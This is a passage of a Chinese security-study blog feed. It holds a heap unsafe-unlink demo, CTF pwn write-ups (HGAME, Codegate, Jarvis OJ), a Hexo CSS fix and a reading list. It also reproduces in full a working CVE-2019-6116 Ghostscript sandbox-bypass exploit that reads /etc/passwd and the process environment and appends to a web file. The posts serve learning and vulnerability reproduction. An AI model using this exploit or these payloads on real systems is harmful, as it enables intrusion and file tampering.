class="number">2</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>, (<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>, (<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False</span></span><br><span class="line">    <span class="comment">// chunk0_ptr[1] = 0x0; // or 0x8, 0x80</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">    chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">    chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deal with tcache</span></span><br><span class="line">    <span class="comment">// int *a[10];</span></span><br><span class="line">    <span class="comment">// int i;</span></span><br><span class="line">    <span class="comment">// for (i = 0; i &lt; 7; i++) &#123;</span></span><br><span class="line">    <span class="comment">//   a[i] = malloc(0x80);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// for (i = 0; i &lt; 7; i++) &#123;</span></span><br><span class="line">    <span class="comment">//   free(a[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> victim_string[<span class="number">9</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(victim_string, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Original value: %s\n"</span>, victim_string);</span><br><span class="line"></span><br><span class="line">    chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4242424242424242</span>LL;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>, victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>$ gcc -g unsafe_unlink.c$ ./a.outThe global chunk0_ptr is at 0x601070, pointing to 0x721010The victim chunk we are going to corrupt is at 0x7210a0Fake chunk fd: 0x601058Fake chunk bk: 0x601060Original value: AAAAAAAANew Value: BBBBBBBB</code></pre><p>这个程序展示了怎样利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的，即 unsafe unlink。</p><p>该技术最常见的利用场景是我们有一个可以溢出漏洞和一个全局指针。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年2月总结</title>
      <link href="/2019/02/25/2019%E5%B9%B42%E6%9C%88%E6%80%BB%E7%BB%93/"/>
      <url>/2019/02/25/2019%E5%B9%B42%E6%9C%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>年前:</p><ol><li>用python完成了一个ctftime的爬虫, 可以指定题目类型, 通过对writeup搜索关键字来找某一类题(eg: fastbin attack)</li><li>搜集了ctftime上的fastbin attack类题目</li><li>参考UCAS Hcaking群的pwntutorialrevisit从头学pwn</li><li>做了一下Codegate CTF 2019的题目</li><li>完善了一下个人博客<br>年后:</li><li>复现了CVE-2019-6116(GhostScript), CVE-2018-20250~3(WinRAR)</li><li>做了HGAME CTF的pwn的部分题目, 对栈的各种花式利用做了一个更深的理解</li><li>简单研究了一下木马免杀</li><li>研究毕业设计(二进制深度神经网络的设计与实现), 找了一些论文和代码</li><li>月赛做了一下乙组的题, 甲组的re1(自动化逆向)研究了一下, 不会做, 其他题目看了一下</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-6116 GhostScript 沙箱绕过（命令执行）漏洞复现</title>
      <link href="/2019/02/20/CVE-2019-6116-GhostScript-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/02/20/CVE-2019-6116-GhostScript-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="refer"><a href="#refer" class="headerlink" title="refer:"></a>refer:</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p><h1 id="过程"><a href="#过程" class="headerlink" title="过程:"></a>过程:</h1><h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC:"></a>PoC:</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%!PS</span><br><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span><br><span class="line">/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def</span><br><span class="line"></span><br><span class="line">/exploit &#123;</span><br><span class="line">    (Stage 11: Exploitation...) ==</span><br><span class="line"></span><br><span class="line">    /forceput exch def</span><br><span class="line"></span><br><span class="line">    systemdict /SAFER false forceput</span><br><span class="line">    systemdict /userparams get /PermitFileControl [(*)] forceput</span><br><span class="line">    systemdict /userparams get /PermitFileWriting [(*)] forceput</span><br><span class="line">    systemdict /userparams get /PermitFileReading [(*)] forceput</span><br><span class="line"></span><br><span class="line">    % All done.</span><br><span class="line">    stop</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">% setup an error handler to catch ifelse /stackoverflow</span><br><span class="line">errordict /stackoverflow &#123;</span><br><span class="line">    (Stage 10: /stackoverflow) ==</span><br><span class="line">    pop</span><br><span class="line">    % extract saved operand stack</span><br><span class="line">    0 get</span><br><span class="line">    % get the last parameter</span><br><span class="line">    dup dup length 1 sub get</span><br><span class="line">    (   Last Parameter:) ==only dup ==</span><br><span class="line">    (   Extracting .forceput...) ==</span><br><span class="line">    % This is the else operator to ifelse</span><br><span class="line">    5 get</span><br><span class="line">    % extract the .forceput</span><br><span class="line">    7 get</span><br><span class="line">    (   Result:) ==only dup ==</span><br><span class="line">    exploit</span><br><span class="line">&#125; put</span><br><span class="line"></span><br><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span><br><span class="line">% executable errays onto the operand stack that contain .forceput, but are not</span><br><span class="line">% marked as executeonly or pseudo-operators.</span><br><span class="line">%</span><br><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span><br><span class="line">% fail because when the routine was declared, it used `bind` but many of the</span><br><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span><br><span class="line">%</span><br><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span><br><span class="line">% works.</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /PDFfile        &#123; (Stage 0: PDFfile) == currentfile &#125;</span><br><span class="line">    /q              &#123; (Stage 1: q) == &#125; % no-op</span><br><span class="line">    /oget           &#123; (Stage 3: oget) == pop pop 0 &#125; % clear stack</span><br><span class="line">    /pdfemptycount  &#123; (Stage 4: pdfemptycount) == &#125; % no-op</span><br><span class="line">    /gput           &#123; (Stage 5: gput) == &#125;  % no-op</span><br><span class="line">    /resolvestream  &#123; (Stage 6: resolvestream) == &#125; % no-op</span><br><span class="line">    /pdfopdict      &#123; (Stage 7: pdfopdict) == &#125; % no-op</span><br><span class="line">    /.pdfruncontext &#123; (Stage 8: .pdfruncontext) == 0 1 mark &#125; % satisfy counttomark and index</span><br><span class="line">    /pdfdict        &#123; (Stage 9: pdfdict) ==</span><br><span class="line">        % fill the stack with junk to trigger a /stackoverflow</span><br><span class="line">        0 1 300051 &#123;&#125; for</span><br><span class="line">        % make sure .knownget doesnt screw up the stack</span><br><span class="line">        &lt;&lt; /.Qqwarning_issued true &gt;&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span><br><span class="line"></span><br><span class="line">(   Should now have complete control over ghostscript, attempting to read /etc/passwd...) ==</span><br><span class="line"></span><br><span class="line">% Demonstrate reading a file we shouldnt have access to.</span><br><span class="line">(/etc/passwd) (r) file dup 64 string readline pop == closefile</span><br><span class="line"></span><br><span class="line">% The getenv operator gets removed and we can&apos;t get it back, here is a</span><br><span class="line">% replacement.</span><br><span class="line">% (HOME) newgetenv (/path/to/home) true     % found</span><br><span class="line">% (foobar) newgetenv false                  % notfound</span><br><span class="line">/newgetenv &#123;</span><br><span class="line">    % read entire environment into string</span><br><span class="line">    (/proc/self/environ) (r) file dup 32768 string readstring pop exch closefile</span><br><span class="line"></span><br><span class="line">    % search for variable</span><br><span class="line">    exch dup (\0) exch concatstrings (=) concatstrings exch 3 1 roll search not &#123;</span><br><span class="line">        % not found, could be at the start, so no leading nul?</span><br><span class="line">        1 index (=) concatstrings anchorsearch not &#123;</span><br><span class="line">            (notfound)</span><br><span class="line">        &#125; &#123; pop &#125; ifelse</span><br><span class="line">    &#125; &#123; pop pop &#125; ifelse</span><br><span class="line"></span><br><span class="line">    % remove everything after path, there is always a nul on Linux.</span><br><span class="line">    (\0) search &#123; 4 1 roll pop pop pop true &#125; &#123;</span><br><span class="line">        % must be the notfound string</span><br><span class="line">        pop pop pop false</span><br><span class="line">    &#125; ifelse</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">% Here is how to edit .bashrc...</span><br><span class="line">/backdoorbash &#123;</span><br><span class="line">    % now we can append to bashrc</span><br><span class="line">    (HOME) newgetenv pop (/var/www/html/index.php) concatstrings (a) file dup</span><br><span class="line"></span><br><span class="line">    % backdoor</span><br><span class="line">    (echo pwned by postscript\n) writestring</span><br><span class="line"></span><br><span class="line">    % all done</span><br><span class="line">    closefile</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">backdoorbash</span><br><span class="line"></span><br><span class="line">(All Done) ==</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME CTF的pwn题 Writeup</title>
      <link href="/2019/02/19/HGAME-CTF%E7%9A%84pwn%E9%A2%98-writeup/"/>
      <url>/2019/02/19/HGAME-CTF%E7%9A%84pwn%E9%A2%98-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Week-1"><a href="#Week-1" class="headerlink" title="Week 1"></a>Week 1</h1><h2 id="babysc"><a href="#babysc" class="headerlink" title="babysc"></a>babysc</h2><p>ez</p><h2 id="aaaaaaaaaa"><a href="#aaaaaaaaaa" class="headerlink" title="aaaaaaaaaa"></a>aaaaaaaaaa</h2><p>ez</p><h2 id="薯片拯救世界1"><a href="#薯片拯救世界1" class="headerlink" title="薯片拯救世界1"></a>薯片拯救世界1</h2><h2 id="Steins-Gate"><a href="#Steins-Gate" class="headerlink" title="Steins;Gate"></a>Steins;Gate</h2><p>分别在以下位置打断点:</p><p>  b <em>0x400930     cmp     eax, 0x2333         # 第一关<br>  b </em>0x4009D5     sub     eax, 0x1234         # 第二关<br>  b *0x400A4C     cmp     [rbp+var_24], 6666h # 第三关</p><p>函数入口:<br>  b <em>0x4008F6<br>  b </em>0x400958<br>  b *0x400A00</p><p>welcome函数, 输入0x30个字节到bss段上</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Welcome to HGAME 2019,let us pwn4fun!"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What's your ID:"</span>, <span class="number">4L</span>L);</span><br><span class="line">read(<span class="number">0</span>, &amp;unk_602040, <span class="number">0x30</span>uLL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"You can get flag after your get the server's shell~"</span>);</span><br></pre></td></tr></table></figure><p>第一关, 存在溢出, 溢出buf到v2上覆盖v2的值位2333即可</p><p>测试0x30个字节可以填满, 后续四个字节写入0x2333</p><p><code>r.sendline(0x30*&#39;b&#39; + &#39;\x33\x23\x00\x00&#39;)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4008F6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"To seek the truth of the world."</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">128u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">0x2333</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来到第二关</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> v4; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">v4 = rand();</span><br><span class="line">v0 = v4;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Repeater is nature of man."</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>LL);</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"You found it?"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x34</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v4 - <span class="number">0x1234</span> != v0 )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>v4是一个随机数, 无法预测, 利用格式化字符串漏洞读取v4的值</p><p><code>%7$p</code>: 64位程序, 函数调用的时候前6个参数是保存在寄存器的, 第七个参数在栈上,</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">               +-------------------+</span><br><span class="line">rbp - 0x50----&gt;+func2 rsp          |</span><br><span class="line">               |                   |</span><br><span class="line">               |                   |</span><br><span class="line">rbp - 0x44+---&gt;+                   +&lt;----------------------+random value</span><br><span class="line">               |                   |</span><br><span class="line">rbp - 0x40----&gt;+func1 rsp          +&lt;-----+func1 buf&lt;------+func2 buf</span><br><span class="line">               |                   |      ^                     ^</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">rbp - 0x30----&gt;+func3 rsp          |      |                     |</span><br><span class="line">               |                   |    0x16 * a              0x30 * a</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">rbp - 0x24+---&gt;+                   +&lt;----\x66\x66-----------------------------+\x66\x66</span><br><span class="line">               |                   |     \x00\x00               |</span><br><span class="line">rbp - 0x20+---&gt;+                   +&lt;-----+-----------------------------------+func3 buf</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">               |                   |      |                     |</span><br><span class="line">               |                   |      v                     v</span><br><span class="line">rbp - 0x10+---&gt;+                   +&lt;-----+\x33\x23&lt;--------+random ^alue</span><br><span class="line">               |                   |cannry+--------------------------------------------+</span><br><span class="line">               |                   |</span><br><span class="line">               |                   |</span><br><span class="line">               |                   |</span><br><span class="line">rbp+----------&gt;+-------------------+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>二进制深度神经网络</title>
      <link href="/2019/02/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
      <url>/2019/02/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="papers"><a href="#papers" class="headerlink" title="papers:"></a>papers:</h1><p><a href="https://arxiv.org/pdf/1602.02830v3.pdf">https://arxiv.org/pdf/1602.02830v3.pdf</a></p><p><a href="http://www.csl.cornell.edu/~zhiruz/pdfs/bnn-fpga2017.pdf">http://www.csl.cornell.edu/~zhiruz/pdfs/bnn-fpga2017.pdf</a></p><p><a href="https://dl.acm.org/citation.cfm?doid=3020078.3021741">https://dl.acm.org/citation.cfm?doid=3020078.3021741</a></p><p><a href="https://arxiv.org/pdf/1808.00278.pdf">https://arxiv.org/pdf/1808.00278.pdf</a></p><p><a href="https://arxiv.org/abs/1711.11294">https://arxiv.org/abs/1711.11294</a><br><a href="https://dl.acm.org/citation.cfm?id=3240673">https://dl.acm.org/citation.cfm?id=3240673</a><br><a href="http://59.80.44.100/delivery.acm.org/10.1145/3310000/3302454/a42-Bai.pdf?ip=111.204.219.198&amp;id=3302454&amp;acc=ACTIVE%20SERVICE&amp;key=33E289E220520BFB%2E99E4F0382D256DD3%2E4D4702B0C3E38B35%2E4D4702B0C3E38B35&amp;__acm__=1550458147_b88e177851fe06d1a9d3bca94f9cf065">http://59.80.44.100/delivery.acm.org/10.1145/3310000/3302454/a42-Bai.pdf?ip=111.204.219.198&amp;id=3302454&amp;acc=ACTIVE%20SERVICE&amp;key=33E289E220520BFB%2E99E4F0382D256DD3%2E4D4702B0C3E38B35%2E4D4702B0C3E38B35&amp;__acm__=1550458147_b88e177851fe06d1a9d3bca94f9cf065</a><br><a href="https://dl.acm.org/citation.cfm?id=3129393">https://dl.acm.org/citation.cfm?id=3129393</a><br><a href="https://arxiv.org/abs/1602.02830">https://arxiv.org/abs/1602.02830</a><br><a href="https://arxiv.org/pdf/1808.00278.pdf">https://arxiv.org/pdf/1808.00278.pdf</a><br><a href="https://arxiv.org/pdf/1603.05279.pdf">https://arxiv.org/pdf/1603.05279.pdf</a></p><p><a href="https://arxiv.org/pdf/1808.00278.pdf">https://arxiv.org/pdf/1808.00278.pdf</a><br><a href="http://120.52.51.13/delivery.acm.org/10.1145/3250000/3240673/p1545-zhao.pdf?ip=111.204.219.198&amp;id=3240673&amp;acc=ACTIVE%20SERVICE&amp;key=33E289E220520BFB%2E99E4F0382D256DD3%2E4D4702B0C3E38B35%2E4D4702B0C3E38B35&amp;__acm__=1552038997_dafa84c3724bdd312a79808a4ae385f3">http://120.52.51.13/delivery.acm.org/10.1145/3250000/3240673/p1545-zhao.pdf?ip=111.204.219.198&amp;id=3240673&amp;acc=ACTIVE%20SERVICE&amp;key=33E289E220520BFB%2E99E4F0382D256DD3%2E4D4702B0C3E38B35%2E4D4702B0C3E38B35&amp;__acm__=1552038997_dafa84c3724bdd312a79808a4ae385f3</a></p><h1 id="github"><a href="#github" class="headerlink" title="github:"></a>github:</h1><p><a href="https://github.com/cornell-zhang/bnn-fpga">https://github.com/cornell-zhang/bnn-fpga</a></p><p><a href="https://github.com/allenai/XNOR-Net">https://github.com/allenai/XNOR-Net</a></p><p><a href="https://github.com/MatthieuCourbariaux/BinaryNet">https://github.com/MatthieuCourbariaux/BinaryNet</a></p><h1 id="other-refer"><a href="#other-refer" class="headerlink" title="other refer:"></a>other refer:</h1><p><a href="https://mp.weixin.qq.com/s/oumf8l28ijYLxc9fge0FMQ">https://mp.weixin.qq.com/s/oumf8l28ijYLxc9fge0FMQ</a></p><p><a href="https://mp.weixin.qq.com/s/tbRj5Wd69n9gvSzW4oKStg">https://mp.weixin.qq.com/s/tbRj5Wd69n9gvSzW4oKStg</a></p><p><a href="https://mp.weixin.qq.com/s/RsZCTqCKwpnjATUFC8da7g">https://mp.weixin.qq.com/s/RsZCTqCKwpnjATUFC8da7g</a></p><p><a href="https://www.chainnews.com/articles/477102982671.htm">https://www.chainnews.com/articles/477102982671.htm</a></p><h1 id="csdn"><a href="#csdn" class="headerlink" title="csdn"></a>csdn</h1><p><a href="https://blog.csdn.net/wangqingbaidu/article/details/52649775">https://blog.csdn.net/wangqingbaidu/article/details/52649775</a></p><p><a href="https://blog.csdn.net/qq_14845119/article/details/84346046">https://blog.csdn.net/qq_14845119/article/details/84346046</a></p><p><a href="https://blog.csdn.net/u014380165/article/details/77731595">https://blog.csdn.net/u014380165/article/details/77731595</a></p><p><a href="https://blog.csdn.net/stdcoutzyx/article/details/50926174">https://blog.csdn.net/stdcoutzyx/article/details/50926174</a></p><p><a href="https://blog.csdn.net/nature553863/article/details/80653521">https://blog.csdn.net/nature553863/article/details/80653521</a></p><p><a href="https://blog.csdn.net/yishuicanhong/column/info/23686">https://blog.csdn.net/yishuicanhong/column/info/23686</a></p><h1 id="methods"><a href="#methods" class="headerlink" title="methods"></a>methods</h1><p>XNOR-Net, Binary-Weight-Networks, BMXNet</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Cactus主题主页有滚动条的解决方法</title>
      <link href="/2019/01/27/hexo-cactus%E4%B8%BB%E9%A2%98%E4%B8%BB%E9%A1%B5%E6%9C%89%E6%BB%9A%E5%8A%A8%E6%9D%A1%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/01/27/hexo-cactus%E4%B8%BB%E9%A2%98%E4%B8%BB%E9%A1%B5%E6%9C%89%E6%BB%9A%E5%8A%A8%E6%9D%A1%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><img src="/2019/01/27/hexo-cactus主题主页有滚动条的解决方法/1.png" alt="img"></p><p>如图所示, cactus主题的hexo博客建立起来以后会有一个滚动条可以上下微微滚动, 本强迫症非常难受</p><p>搜了一波解决方案:</p><p><a href="https://www.thinkcss.com/css/921.shtml">https://www.thinkcss.com/css/921.shtml</a></p><pre><code>要实现最外层div高度为100%（百分之百关键对html和body要设置高度100%如果只设置html和body标签其中一个高100%，也是无法实现body内第一个盒子高度100%的。但由于body默认有一定margin值，但设置body高度height 100%后，浏览器就会出现滚动条，所以可以对body设置margin为零，去除间距实现div height 100%也无滚动条效果。</code></pre><p>打开hexo的文件夹, 在 <code>./themes/cactus/source/css/style.styl</code> 文件里</p><p>body下加一行 <code>margin: 0</code> 即可解决</p><p><img src="/2019/01/27/hexo-cactus主题主页有滚动条的解决方法/2.png" alt="img"></p><p><img src="/2019/01/27/hexo-cactus主题主页有滚动条的解决方法/3.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codegate CTF 2019</title>
      <link href="/2019/01/26/Codegate-CTF-2019/"/>
      <url>/2019/01/26/Codegate-CTF-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>base85一把梭</p><h1 id="KingMaker"><a href="#KingMaker" class="headerlink" title="KingMaker"></a>KingMaker</h1><h1 id="20000"><a href="#20000" class="headerlink" title="20000"></a>20000</h1><p>给了20k个.so文件, 然后用一个程序去调用, 分类一波以后一共如下四种:</p><ol><li>filter1<br> 过滤了;, *, |, &amp;, $, `, &gt;, &lt;, r</li><li>filter2<br> 过滤了v, m, p, d, n, bin, sh, bash, f, l, g     </li><li><p>test1</p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"This is lib_100 file."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"How do you find vulnerable file?"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x32</span>uLL);</span><br><span class="line">system(<span class="string">"exit"</span>);</span><br></pre></td></tr></table></figure></li><li><p>test2<br> 用filter1和filter2过滤后, 执行system(“ls \”input\”)</p></li></ol><p>看起来似乎是命令注入</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis Oj Pwn 做题记录</title>
      <link href="/2019/01/24/jarvis-oj-pwn-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/01/24/jarvis-oj-pwn-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-tell-me-something-Point-100"><a href="#0x01-tell-me-something-Point-100" class="headerlink" title="0x01 tell me something Point:100"></a>0x01 tell me something Point:100</h2><p>checksec:</p><pre><code>Arch:     amd64-64-littleRELRO:    No RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)</code></pre><p>很明显的漏洞点:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input your message:\n"</span>, <span class="number">20u</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">256u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"I have received your message, Thank you!\n"</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>read处读取了256个字符, 但是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000004004E0 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000004004E0                 public main</span><br><span class="line">.text:00000000004004E0 main            proc near               ; DATA XREF: _start+1D↓o</span><br><span class="line">.text:00000000004004E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004004E0                 sub     rsp, 88h</span><br><span class="line">.text:00000000004004E7                 mov     edx, 14h        ; n</span><br><span class="line">.text:00000000004004EC                 mov     esi, offset aInputYourMessa ; &quot;Input your message:\n&quot;</span><br><span class="line">.text:00000000004004F1                 mov     edi, 1          ; fd</span><br><span class="line">.text:00000000004004F6                 call    _write</span><br><span class="line">.text:00000000004004FB                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004004FE                 mov     edx, 100h       ; nbytes</span><br><span class="line">.text:0000000000400503                 xor     edi, edi        ; fd</span><br><span class="line">.text:0000000000400505                 call    _read</span><br><span class="line">.text:000000000040050A                 mov     edx, 29h        ; n</span><br><span class="line">.text:000000000040050F                 mov     esi, offset aIHaveReceivedY ; &quot;I have received your message, Thank you&quot;...</span><br><span class="line">.text:0000000000400514                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000400519                 call    _write</span><br><span class="line">.text:000000000040051E                 add     rsp, 88h</span><br><span class="line">.text:0000000000400525                 retn</span><br><span class="line">.text:0000000000400525 ; &#125; // starts at 4004E0</span><br><span class="line">.text:0000000000400525 main            endp</span><br></pre></td></tr></table></figure></p><p>根据<code>sub     rsp, 88h</code>可知main函数的栈空间只有0x88 = 136字节, read的时候会溢出</p><p>我们输入12345678后看一下栈</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x/100g $sp</span><br><span class="line">0x7fffffffde20:0x38373635343332310x000000000000000a</span><br><span class="line">0x7fffffffde30:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>按照小端序存放的输入, 即高字节存放在低地址, 低字节存放在高地址, 按4字节对齐</p><p>输入的<code>12345678</code>即<code>\x31\x32\x33\x34\x35\x36\x37\x38</code></p><pre><code>gef➤  x/10xw $sp0x7fffffffde20:    0x34333231    0x38373635    0x0000000a    0x000000000x7fffffffde30:    0x00000000    0x00000000    0x00000000    0x000000000x7fffffffde40:    0x00000000    0x00000000</code></pre><p>可以看到1234按4321的顺序放在0x7fffffffde20-0x7fffffffde23</p><p>5678按8765的顺序放在0x7fffffffde24-0x7fffffffde27</p><p>read函数结束的时候会返回到main函数继续执行, 返回的地址是保存在栈中的, 因此可以利用栈溢出覆盖返回地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">good_game</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+Fh] [rbp-9h]</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span 